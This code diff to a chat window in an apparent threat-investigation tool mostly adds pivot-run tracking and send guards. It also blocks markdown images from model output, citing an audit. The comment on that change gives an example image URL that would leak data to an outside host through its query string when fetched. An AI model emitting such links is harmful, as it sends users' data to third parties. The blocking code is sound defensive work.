@@ -23,7 +23,7 @@ import { checkCachedHitSafety, useReviewStates, type ReviewState } from "@/lib/r
 import { buildDecisionSets, isManualDispatchRefused } from "@/lib/analyst-decisions";
 import { KIND_TO_PIVOT } from "@/lib/intel";
 import { useThreadArtifacts } from "@/hooks/useThreadArtifacts";
-import { useThreadQueriedTargets } from "@/hooks/useThreadQueriedTargets";
+import { queriedTargetSet, useThreadQueriedCalls } from "@/hooks/useThreadQueriedTargets";
 import { isSubmitBlocked, submitRefusal, submitRefusalMessage } from "@/lib/submit-guard";
 import { messageIntegrity, narrativeIsUnadjudicated } from "@/lib/message-integrity";
 import { RunChips, RunMenu } from "@/components/pivots/RunControls";
@@ -36,6 +36,7 @@ import {
   autoRunStopMessage, canShowRunControls, decideAutoContinue,
 } from "@/lib/run-controls";
 import { cardDedupeKey, normalizeTarget } from "@/lib/next-step-cards";
+import { closeLatestPivotRun, derivePivotRunViews, pivotRunKey, pivotSendHooks, usePivotRuns } from "@/lib/pivot-runs";
 import { pivotEligibility, pivotSuggestionInput, validatePivotSuggestion, type RunnablePivot } from "@/lib/pivot-schema";
 import { NextSteps, type NextStepItem } from "@/components/pivots/NextSteps";
 import { countWorkbenchRunnablePivots } from "@/lib/next-step-queue";
@@ -1015,7 +1016,39 @@ const chatMarkdownComponents: Components = {
   ),
   th: ({ node, children, ...rest }) => <th {...rest}>{children}</th>,
   td: ({ node, children, ...rest }) => <td {...rest}>{wrapChildren(children)}</td>,
+  // Never load a markdown image (audit SEC-05). Model and tool text is
+  // untrusted: `![](https://host/p.png?d=…)` would fetch on paint and hand the
+  // query string to that host. Disclose it as plain text instead, with no link,
+  // so nothing is fetched or one click away. Analyst uploads are a direct <img>
+  // in MessageViewImpl and do not pass through here.
+  img: ({ alt, src, title }) => <BlockedImage alt={alt} src={src} title={title} />,
 };
+
+const BLOCKED_IMAGE_SRC_MAX = 80;
+
+// Where the model pointed is part of the disclosure. A protocol-relative or
+// data: src has no usable hostname, so fall back to the raw text (truncated,
+// never a link) rather than hiding the target.
+function blockedImageTarget(src?: string): string {
+  if (!src) return "";
+  try {
+    const host = new URL(src).hostname;
+    if (host) return host;
+  } catch {
+    // not an absolute URL
+  }
+  const raw = src.trim();
+  return raw.length > BLOCKED_IMAGE_SRC_MAX ? `${raw.slice(0, BLOCKED_IMAGE_SRC_MAX)}…` : raw;
+}
+
+function BlockedImage({ alt, src, title }: { alt?: string; src?: string; title?: string }) {
+  const target = blockedImageTarget(src);
+  return (
+    <span className="chat-blocked-image text-muted-foreground">
+      [image not loaded{alt ? `: ${alt}` : ""}{title ? ` ("${title}")` : ""}{target ? ` · ${target}` : ""}]
+    </span>
+  );
+}
 
 const CHAT_REMARK_PLUGINS = [remarkGfm];
 
@@ -1502,18 +1535,34 @@ function ChatWindowInner({
   const submitLockRef = useRef(false);
   const [rerunBusy, setRerunBusy] = useState(false);
   const { items: artifacts } = useThreadArtifacts(threadId);
+  // Read at send time to anchor pivot-run windows on server timestamps.
+  const artifactsRef = useRef(artifacts);
+  artifactsRef.current = artifacts;
+  // Any send that is not a pivot's own ends the latest pivot's claim to the run.
+  // The withdraw hook of the pivot whose send is in flight, so a send the SDK
+  // routes to onError (a 409 for a server-held run, a dead stream) takes its
+  // Running card down with it. Cleared by any non-pivot send.
+  const pivotFailRef = useRef<(() => void) | null>(null);
+  const closePivotRun = useCallback(() => {
+    pivotFailRef.current = null;
+    closeLatestPivotRun(threadId, artifactsRef.current);
+  }, [threadId]);
   // Optional: absent in standalone renders/tests. Used only to keep the run
   // controls off a thread whose run is live in another tab (overlap guard).
   const caseSnapshot = useOptionalCaseSnapshot();
   const serverRunActive = caseSnapshot?.snapshot?.run.state === "running";
   const serverRunStartedAt = caseSnapshot?.snapshot?.run.startedAt ?? null;
+  // Pivots this tab started: they leave the Next-steps queue and show above it
+  // as Running, then Completed (see lib/pivot-runs.ts).
+  const pivotRuns = usePivotRuns(threadId);
   // Read at CALL time (delayed auto-continue, send guards) so a callback built
   // while a run was live does not keep refusing after it ends.
   const serverRunActiveRef = useRef(serverRunActive);
   serverRunActiveRef.current = serverRunActive;
   // Targets tools have already been run against — the "already investigated"
   // signal that stops the rail re-suggesting a pivot that's already been run.
-  const queriedTargets = useThreadQueriedTargets(threadId);
+  const queriedCalls = useThreadQueriedCalls(threadId);
+  const queriedTargets = useMemo(() => queriedTargetSet(queriedCalls), [queriedCalls]);
   // Analyst decisions. They shape the "Next steps" rail (a rejected selector is
   // never suggested, a Key one ranks first, a Recheck one is a verification
   // task) and they GATE the pivot bus: a "Run this pivot" on a rejected
@@ -1635,6 +1684,13 @@ function ChatWindowInner({
     transport,
     onError: async (e) => {
       if (!user || failSavedRef.current) return;
+      // Read synchronously: the failing send is still the current one here,
+      // and nothing can replace it before the first await below.
+      const withdrawPivot = pivotFailRef.current;
+      const failPivotSend = () => {
+        withdrawPivot?.();
+        if (pivotFailRef.current === withdrawPivot) pivotFailRef.current = null;
+      };
       // Ignore aborts caused by the user navigating away — the run continues
       // in the background and onFinish will save the assistant message.
       const msg = String(e?.message ?? "");
@@ -1650,6 +1706,7 @@ function ChatWindowInner({
       // A provider's 401 surfaced mid-stream ("…rejected the API key (401)…") is NOT the
       // analyst's session and must never sign them out (lib/tool-run.ts isTransportAuthFailure).
       if (isTransportAuthFailure(e)) {
+        failPivotSend();
         toast.error(friendly);
         navigate("/auth");
         return;
@@ -1719,6 +1776,8 @@ function ChatWindowInner({
         // through to persist the marker, exactly as before this branch existed.
         if (suppressedDropErrorRef.current === e) markDropSuppressed(null);
       }
+      // The send is dead, so the pivot it carried goes back to the queue.
+      failPivotSend();
       // Persist a failed assistant marker so reload shows the failed card
       await supabase.from("messages").insert({
         thread_id: threadId,
@@ -2089,6 +2148,7 @@ function ChatWindowInner({
     setControls(DEFAULT_CONTROLS);
     try {
       await beginInvestigation();
+      closePivotRun();
       await sendMessage({ text: composed });
     } catch (e) {
       // useChat's onError only fires for stream errors. Pre-stream failures
@@ -2162,20 +2222,29 @@ function ChatWindowInner({
   };
 
   // Send arbitrary text without going through the input (used by pivots + suggestions).
-  const sendText = useCallback(async (text: string) => {
+  // `hooks` let a pivot be recorded only once its send is accepted, and withdrawn
+  // if the send then rejects (see pivotSendHooks). A blocked send calls neither.
+  const sendText = useCallback(async (text: string, hooks?: { onAccepted?: () => void; onFailed?: () => void }) => {
     const t = text.trim();
     if (!t || isSubmitBlocked(status, submitLockRef.current, serverRunActiveRef.current)) return;
     submitLockRef.current = true;
+    let accepted = false;
     try {
       await beginInvestigation();
+      accepted = true;
+      if (hooks?.onAccepted) {
+        hooks.onAccepted();
+        pivotFailRef.current = hooks.onFailed ?? null;
+      } else closePivotRun();
       await sendMessage({ text: t });
     } catch (e) {
+      if (accepted) hooks?.onFailed?.();
       console.error("sendText failed:", e);
       toast.error(`Failed to send message: ${describeTransportError(e)}`);
     } finally {
       submitLockRef.current = false;
     }
-  }, [beginInvestigation, sendMessage, status]);
+  }, [beginInvestigation, closePivotRun, sendMessage, status]);
 
   // --- Run controls -------------------------------------------------------
   // Continue = one more cycle. Auto-run = keep cycling while each cycle still
@@ -2206,13 +2275,19 @@ function ChatWindowInner({
       return;
     }
     stoppedByAnalystRef.current = false;
+    // Recorded only once sendText accepts the send, so a cycle that never
+    // started is never shown as a running pivot.
+    const autoPivot = autoPivotRef.current;
+    const hooks = countAsAutoCycle && autoPivot && prompt === autoPivot.prompt
+      ? pivotSendHooks(threadId, { ...autoPivot, origin: "auto" }, () => artifactsRef.current)
+      : undefined;
     setAutoRun((prev) => ({
       ...prev,
       cyclesRun: countAsAutoCycle ? prev.cyclesRun + 1 : prev.cyclesRun,
       artifactsBefore: artifactsCountRef.current,
     }));
-    await sendText(prompt);
-  }, [sendText, status]);
+    await sendText(prompt, hooks);
+  }, [sendText, status, threadId]);
   const runContinue = useCallback(() => { void sendCycle(CONTINUE_PROMPT, false); }, [sendCycle]);
   const runWriteReport = useCallback(() => {
     // A report request is the natural end of Auto-run.
@@ -2235,7 +2310,7 @@ function ChatWindowInner({
   // Listen for "run pivot" events dispatched from the Pivots tab.
   useEffect(() => {
     const onRunPivot = (e: Event) => {
-      const detail = (e as CustomEvent<{ threadId: string; value: string; type?: string; prompt?: string }>).detail;
+      const detail = (e as CustomEvent<{ threadId: string; value: string; type?: string; prompt?: string; action?: string }>).detail;
       if (!detail || detail.threadId !== threadId) return;
       // MANUAL DISPATCH GUARD. Every surface that runs a pivot — the Pivots
       // tab, "queue all", the command palette, a Recheck launch — rides this
@@ -2252,14 +2327,23 @@ function ChatWindowInner({
       }
       // A run already in flight holds the submit lock, and sendText would drop
       // this pivot without a word. Say so instead.
-      if (isSubmitBlocked(status, submitLockRef.current)) {
+      // Same three-argument check sendText applies, so a run the server still
+      // holds (after a reload or a dropped stream) is refused here, out loud,
+      // instead of toasting "sent" for a send sendText then drops.
+      if (isSubmitBlocked(status, submitLockRef.current, serverRunActiveRef.current)) {
         toast.info("A run is in progress on this case. Start the pivot when it finishes.");
         return;
       }
       const prompt = detail.prompt ??
         `Pivot on ${detail.value}${detail.type ? ` (${detail.type})` : ""}. Run the next investigation step on this lead.`;
       toast.success(`Pivot on ${detail.value} sent to the agent`);
-      void sendText(prompt);
+      // Past the dispatch guard and the submit lock; recorded once sendText
+      // accepts the send, withdrawn if it then rejects.
+      void sendText(prompt, pivotSendHooks(
+        threadId,
+        { target: detail.value, targetType: detail.type, action: detail.action ?? "Pivot", origin: "manual" },
+        () => artifactsRef.current,
+      ));
     };
     window.addEventListener("proximity:run-pivot", onRunPivot as EventListener);
     // Tell the Pivots surface that something on this page can actually run a
@@ -2276,7 +2360,7 @@ function ChatWindowInner({
   // sendText directly and skip that refusal.
   const runPivotFromRail = useCallback((p: RunnablePivot) => {
     window.dispatchEvent(new CustomEvent("proximity:run-pivot", {
-      detail: { threadId, value: p.target, type: p.targetType, prompt: p.prompt },
+      detail: { threadId, value: p.target, type: p.targetType, prompt: p.prompt, action: p.action },
     }));
   }, [threadId]);
 
@@ -2443,6 +2527,7 @@ function ChatWindowInner({
       }
       setMessages((prev) => prev.filter((m) => !(m.role === "assistant" && (m.parts as MessagePartShape[]).some((p) => p?.type === CACHE_BANNER_TYPE))));
       await beginInvestigation();
+      closePivotRun();
       await sendMessage({ text });
     } finally {
       setRerunBusy(false);
@@ -2491,6 +2576,7 @@ function ChatWindowInner({
       return out;
     });
     await beginInvestigation();
+    closePivotRun();
     await sendMessage({ text });
     } catch (e) {
       console.error("retry failed:", e);
@@ -2866,6 +2952,17 @@ function ChatWindowInner({
   // Build suggested next-step replies after the agent stops streaming.
   // Memoized — without this the IIFE re-runs on every streamed token because
   // `messages` updates dozens of times per second during streaming.
+  const pivotRunViews = useMemo(
+    () => derivePivotRunViews(pivotRuns, { caseRunning: isLoading || serverRunActive, artifacts, queriedCalls }),
+    [pivotRuns, isLoading, serverRunActive, artifacts, queriedCalls],
+  );
+  // A pivot leaves the suggestions while it runs or once a tool call was
+  // recorded against it. An ended run with none (stopped, errored, never
+  // reached) puts it back: that pivot is unknown, not done.
+  const sentPivotKeys = useMemo(
+    () => new Set(pivotRunViews.filter((v) => v.phase !== "ended").map((v) => v.run.key)),
+    [pivotRunViews],
+  );
   const suggestions = useMemo(() => {
     if (isLoading || messages.length === 0) return [] as NextStepItem[];
     // Wait for every input the ranking depends on, so the list is stable when shown.
@@ -2906,7 +3003,7 @@ function ChatWindowInner({
     // collected (bounded) and shown behind one disclosure line by NextSteps.
     const repair: NextStepItem[] = [];
     let runnable = 0;
-    for (const p of ranked.filter((candidate) => candidate.status === "new")) {
+    for (const p of ranked.filter((candidate) => candidate.status === "new" && !sentPivotKeys.has(pivotRunKey(candidate.type, candidate.value)))) {
       if (runnable >= 3) break;
       const dedupe = cardDedupeKey({ title: p.actionLabel, target: p.value });
       if (seenKeys.has(dedupe)) continue;
@@ -2938,7 +3035,7 @@ function ChatWindowInner({
       out.push({ kind: "action", key: `action:${g.title}`, title: g.title, detail: g.detail, prompt: g.prompt });
     }
     return [...out.slice(0, 4), ...repair];
-  }, [isLoading, messages, artifacts, seedValue, seedLoaded, reportPivots, pivotSkip, queriedTargets, review.map, review.availability]);
+  }, [isLoading, messages, artifacts, seedValue, seedLoaded, reportPivots, pivotSkip, queriedTargets, review.map, review.availability, sentPivotKeys]);
 
   // The Workbench's Next-tab runnable count — the number the transcript's
   // compact handoff line prints. Different from `suggestions.length` because
@@ -3166,6 +3263,8 @@ function ChatWindowInner({
                 onRunPivot={runPivotFromRail}
                 onRunAction={(prompt) => void sendText(prompt)}
                 busy={isLoading}
+                runs={pivotRunViews}
+                onViewChanges={(artifactId) => window.dispatchEvent(new CustomEvent("swarmbot:navigate", { detail: { tab: "artifacts", artifactId } }))}
                 openKey={openStep}
                 onOpenChange={setOpenStep}
                 connections={connections}
